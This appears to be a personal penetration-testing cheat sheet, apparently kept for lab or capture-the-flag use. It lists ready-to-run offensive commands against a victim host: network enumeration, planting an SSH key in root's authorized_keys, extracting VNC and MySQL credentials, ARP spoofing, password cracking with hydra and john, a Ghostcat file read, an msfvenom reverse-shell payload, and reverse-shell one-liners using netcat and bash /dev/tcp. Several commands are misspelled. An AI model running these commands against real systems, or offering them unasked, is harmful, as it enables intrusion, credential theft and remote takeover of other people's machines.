[Enumeration](#enumeration)
[Services](#services)
[Resources](#resources)
[Exploits](#exploits)
[Remoteshell](#remote-shell)
[Linux](#linux)



# Enumeration
### Netdiscover
    sudo netdiscover
###  Nslookup
    nslookup netdiscover
      
    nslookup
    set q=ms  |  set q=ns
    URL
### Nmap
    nmap [VictimIP] -p- -Pn -sSCV (-oN [file]) (-p [port])
### Enum4linux
    enum4linux -a [VictimIP]

# Services
### Tor&Proxychains
    sudo service tor start
    sudo netstart -tulpn
    sudo nano /etc/proxychains4.conf
    proxychains firefox google.com
    proxychains curl ifconfig.io
### Netcat
    nc [IP] [port]
        GET /HTTP/1.1
        Host: [IP]

    nc -nvlp [port] (> file)
        cat [file] | nc [IP] [port]
### Curl
    curl [IP:port or URL]
### Ftp
    ftp [victim IP]
### Smb
    smbclient -L \\\\[VictimIP]\\
    
    impacket-smbclient [VictimIP]
        shares
        use [dir]
### Nfc
    showmount -e [VictimIP]
    sudo mount -t nfs [VictimIP]:/ /mnt
### Generate hash for users
    openssl passwd [Password]
### .Deb dpkg
    sudo dpkg -i [file].deb
### Nessus
    sudo servise nessusd start
        https://127.0.0.1:8834/#/
### SSH
    sudo su
    cd ~/root/.ssh
    ssh-keygen -t rsa
    cat id_rsa.pub
    echo ssh-rsa [key] >> authorized_keys
    ssh root@[IP] -o HostKeyAlgoritms=+ssh-rsa -o PubKeyAcceptedKeyTypes=+ssh-rsa
### VNC
    cat vnc.log
    cat ~/.vnc/passwd
    cat passwd | base64
    echo [base64code] | base64 -d > passwd
    vncviewer -passwd passwd [VictimIP]
### Mysql
    mysql -h [VictimIP] -u [root] --skip-ssl
        show databases;
        use [tikiwiki];
        show tables;
        select [*, login, password] from [tiki_users];

# Resources
### searchsploit
    searchsploit [vulnerable]
    cd [path]
    serchsploit -m [exploit.(py)]
    nano [file]
### msfvenom
    msfvenom -p [java/jsp_shell_reverse_tcp LHOST=[IP] LPORT=[port] -f war -o rev.war]

# Exploits
    1.sudo nano /proc/sys/net/ipv4/ip_forward    (0->1)
      sudo arpspoof -t [VictimIP] [RouterIP]
    2.john --wordlist=/usr/share/wordlists/rockyou.txt file
        (sudo gunzip /usr/share/wordlists/rockyou.txt.gz)
    3.python2 distccd.py -t [VictimIP] -p [port] -c "[code]"
### Ghostcat
    python2 [ghostcat.py] [VictimIP] -f ../../../../etc/tomcat5.5/tomcat-users.xml
### Hydra
    hydra -l [user] -P [/usr/share/wordlists/rockyou.txt] [ftp://[VictimIP]]

# Remote shell
    1.python -c 'import pty; pty.spawn("/bin/bash")'
    2.nc [IP] [port] -e /bin/bash
    3.bash -c "bash -i >& /dev/tcp/[IP]/[port] 0>&1"

# Linux
### Processes
    ps aux
    [kill] [id]
    jobs